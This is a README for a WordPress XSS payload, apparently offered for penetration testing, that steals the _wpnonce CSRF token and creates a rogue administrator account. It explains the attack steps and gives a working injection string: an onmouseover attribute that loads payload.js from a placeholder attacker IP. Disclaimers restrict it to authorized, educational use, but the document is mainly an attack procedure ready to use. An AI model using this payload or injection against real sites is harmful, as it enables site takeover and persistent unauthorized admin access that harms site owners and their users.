# WordPress Weaponized XSS Payload: Create Admin User
This JavaScript code demonstrates how to exploit an **XSS (Cross-Site Scripting)** vulnerability on a WordPress site to create a new **administrator user** by injecting a malicious payload.

## ⚠️ Disclaimer

This code is provided **for educational purposes only**. The use of this code without authorization is illegal. Please ensure you have permission from the website owner before performing any tests or deploying this script.

## 🛠️ How It Works

1. **Fetch the HTML** of the `/wp-admin/user-new.php` page to extract the CSRF token.
2. **Parse the `_wpnonce`** value from the response.
3. **Send a POST request** to create a new administrator user with the provided credentials.
---

## 🚨 Legal Notice

This script is intended for **authorized penetration testing and educational purposes only**. Unauthorized use of this code against websites is illegal and unethical. The authors of this code do **not take responsibility** for any misuse.

---

## 🧑‍💻 Usage

1. Copy and paste the script into a browser console or inject it via an **XSS vulnerability**.
For example: ``http://target.com/?page=" onmouseover="var script = document.createElement('script'); script.src = 'http://XX.XX.XX.XX/payload.js'; document.head.appendChild(script);``
3. Ensure you are **authenticated as an administrator** in the target WordPress site.
4. The script will create a new administrator user with the provided credentials.
